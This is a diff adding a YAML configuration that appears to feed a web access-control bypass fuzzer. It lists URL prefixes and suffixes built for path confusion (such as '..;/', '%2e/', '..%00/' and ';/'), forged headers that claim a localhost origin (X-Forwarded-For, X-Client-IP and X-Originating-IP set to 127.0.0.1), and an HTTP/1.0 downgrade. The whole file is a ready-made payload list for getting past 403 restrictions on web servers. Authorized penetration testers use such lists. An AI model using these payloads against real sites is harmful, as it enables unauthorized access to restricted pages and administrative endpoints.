@@ -1,0 +1,54 @@
+suffix:
+    - ".js"
+    - ".css"
+    - ".json"
+    - ".html"
+    - ";.css"
+    - ";.js"
+    - "/."
+    - "/"
+    - "/./"
+    - "%20"
+    - "%09"
+    - "?"
+    - "?error"
+    - "#"
+    - "/*"
+    - "%26"
+    - "/images/..;"
+    - "/public/..;"
+    - ";/"
+
+headers:
+    -
+      X-Custom-IP-Authorization: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      X-Remote-Addr: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      Referer: http://127.0.0.1
+
+#    - X-Original-URL: {{Baseurl}}
+    - X-Forwarded-For: 127.0.0.1:80
+    - X-Forwarded-For: http://127.0.0.1
+    - X-Host: 127.0.0.1
+#      http/1.0 无头协议绕过
+    - HTTP-Version: HTTP/1.0
+
+prefix:
+    - "/"
+    - ";/"
+    - "..;/"
+    - "images;/../"
+    - "images/..;/"
+    - "public/..;/"
+    - "%2e/"
+    - ";/"
+    - "./"
+    - "%20/"
+    - "%09/"
+    - ".;/"
+    - "..%00/"
+    - "..%0d/"
+    - "..%5c/"
+    - "#/../"
